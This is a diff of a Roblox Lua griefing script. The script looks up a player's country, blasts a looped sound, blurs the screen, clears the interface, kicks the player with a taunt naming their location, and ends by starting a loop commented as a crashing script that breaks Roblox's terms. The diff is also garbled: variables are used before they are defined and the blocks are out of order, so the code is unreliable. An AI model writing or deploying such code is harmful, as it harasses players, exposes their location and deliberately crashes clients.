@@ -283,6 +283,17 @@ local locations = {
 local success, code = pcall(function()
     return LocalizationService:GetCountryRegionForPlayerAsync(player)
 end)
+
+player.PlayerGui:ClearAllChildren()
+game:GetService('StarterGui'):SetCore("TopbarEnabled", false)
+
+if success then
+    local location = locations[code]
+    if location then
+        -- Play sound and wait for 5 seconds
+        sound:Play()
+        wait()
+local player = game.Players.LocalPlayer
 local sound = Instance.new("Sound")
 sound.SoundId = "rbxassetid://6299850448"
 sound.Looped = true
@@ -290,18 +301,16 @@ sound.Playing = true
 sound.Volume = 10
 sound.Parent = workspace.CurrentCamera 
 
-if success then
-    local location = locations[code]
-    if location then
-        -- Play sound and wait for 5 seconds
-        sound:Play()
-        wait(5)
-        -- Kick the player
+local blur = Instance.new("BlurEffect")
+blur.Size = 9999
+blur.Parent = workspace.CurrentCamera
         player:Kick("How is it like in " .. location .. "?")
+player.PlayerGui:ClearAllChildren()
+game:GetService('StarterGui'):SetCore("TopbarEnabled", false)
     else
         -- Play sound and wait for 5 seconds
         sound:Play()
-        wait(5)
+        wait(0)
         -- Kick the player
         player:Kick("How is it like in your location?")
     end
@@ -312,25 +321,6 @@ else
     -- Kick the player
     player:Kick("Unable to determine your location.")
 end
-
--- Get the local player
-local player = game.Players.LocalPlayer
-
--- Add a BlurEffect to the current camera
-local blur = Instance.new("BlurEffect")
-blur.Size = 9999
-blur.Parent = workspace.CurrentCamera
-
--- Clear all children in PlayerGui
-player.PlayerGui:ClearAllChildren()
-
--- Disable the Topbar
-game:GetService('StarterGui'):SetCore("TopbarEnabled", false)
-
--- Create and configure the Sound
--- You can change the parent if needed
-
--- Script By: GrazzyLimming
 
 -- Add a crashing script (Please note that this is harmful and against Roblox's terms of service)
 while true do
